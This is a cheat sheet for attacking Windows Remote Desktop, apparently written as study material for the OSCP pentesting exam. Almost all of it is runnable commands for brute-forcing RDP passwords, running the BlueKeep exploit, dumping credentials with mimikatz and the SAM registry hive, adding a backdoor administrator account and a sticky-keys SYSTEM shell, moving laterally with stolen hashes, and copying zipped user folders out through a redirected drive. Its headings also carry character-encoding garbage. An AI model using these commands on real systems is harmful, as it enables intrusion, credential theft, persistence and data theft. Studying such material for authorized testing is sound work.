# üß± **RDP Pentesting ‚Äì OSCP Field Guide**

> **Service:** Remote Desktop Protocol
> **Port:** `3389/tcp`
> **Protocol:** Microsoft proprietary GUI remote access

---

## üîç 1. Recon & Discovery

```bash
nmap -p 3389 target
nmap -p 3389 -sV target
```

### Extract OS & Security Info

```bash
nmap -p 3389 --script rdp-ntlm-info target
nmap -p 3389 --script rdp-enum-encryption target
```

> **Look for**

* Windows version
* NLA enabled/disabled
* Encryption level
* CredSSP usage

---

## üè∑Ô∏è 2. Banner Grabbing

```bash
python rdp-sec-check.py target
openssl s_client -connect target:3389 < /dev/null 2>&1 | openssl x509 -noout -text
```

---

## üß≠ 3. Username Enumeration

RDP reveals different errors for valid vs invalid users.

### Tools

```bash
rdp_check.exe target users.txt
crowbar -b rdp -s target/32 -u users.txt -C passwords.txt
```

**Common users**

```
Administrator
admin
user
guest
```

---

## üîê 4. Credential Attacks

### Brute Force

```bash
hydra -t 1 -V -f -l administrator -P passwords.txt rdp://target
ncrack -vv --user administrator -P passwords.txt rdp://target
medusa -h target -u administrator -P rdp.txt -M rdp -F
crowbar -b rdp -s target/32 -u administrator -C passwords.txt
```

### Metasploit Scan

```bash
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS target
run
```

---

## üß¨ 5. RDP Login

```bash
xfreerdp3 /u:administrator /p:password /v:target

# Force legacy RDP if TLS/NLA fail
xfreerdp /v:target /sec:rdp /cert:ignore /u:username

# Force TLS only
xfreerdp /v:target /sec:tls /cert:ignore /u:username

# Force NLA only
xfreerdp /v:target /sec:nla /cert:ignore /u:username

xfreerdp3 /u:DOMAIN\\user /p:password /v:target
xfreerdp3 /u:administrator /pth:NTHASH /v:target /cert:ignore
```

---

## üß® 6. Exploitation

### BlueKeep (CVE-2019-0708)

```bash
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
run

use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS target
set TARGET 2
exploit
```

---

## üïµÔ∏è 7. Post-Exploitation

### Credential Dumping

```bash
mimikatz
privilege::debug
sekurlsa::logonpasswords
```

### SAM Extraction

```bash
reg save HKLM\SAM sam
reg save HKLM\SYSTEM system
impacket-secretsdump -sam sam -system system LOCAL
```

---

---
## üß± 8. Persistence

```bash
net user backdoor P@ssw0rd123! /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add
```

### Sticky Keys Backdoor

```bash
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```

Press **Shift 5x** at login ‚Üí SYSTEM shell.

---

## üåê 9. Lateral Movement

```bash
xfreerdp /u:administrator /pth:HASH /v:another-host
psexec \\another-host -u user -p pass cmd
wmic /node:another-host /user:user /password:pass process call create "cmd.exe"
```

---

## üì§ 10. Data Exfiltration

```powershell
Compress-Archive C:\Users\ C:\Temp\loot.zip
copy C:\Temp\loot.zip \\tsclient\c\loot\
```

---

## üßó 11. Privilege Escalation Checks

```bash
whoami /all
whoami /priv
wmic service get name,pathname,startmode | findstr /i auto | findstr /v """
```

AlwaysInstallElevated:

```bash
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

---

## ‚ö†Ô∏è High-Value Misconfigurations (OSCP Gold)

* ‚ùå No NLA
* ‚ùå No lockout policy
* ‚ùå Weak/default creds
* ‚ùå Exposed to internet
* ‚ùå Clipboard & drive redirection
* ‚ùå No MFA
* ‚ùå Outdated Windows
* ‚ùå No logging/monitoring

---

## üß™ CVEs to Remember

| CVE                | Name       | Impact       |
| ------------------ | ---------- | ------------ |
| CVE-2019-0708      | BlueKeep   | Wormable RCE |
| CVE-2019-1181/1182 | RD Gateway | RCE          |
| CVE-2020-0609/0610 | RD Gateway | RCE          |
| CVE-2012-0002      | MS12-020   | DoS          |

---

## üß∞ Tools for OSCP

`xfreerdp` ‚Ä¢ `crowbar` ‚Ä¢ `hydra` ‚Ä¢ `ncrack` ‚Ä¢ `Metasploit` ‚Ä¢ `mimikatz` ‚Ä¢ `impacket` ‚Ä¢ `Seth`



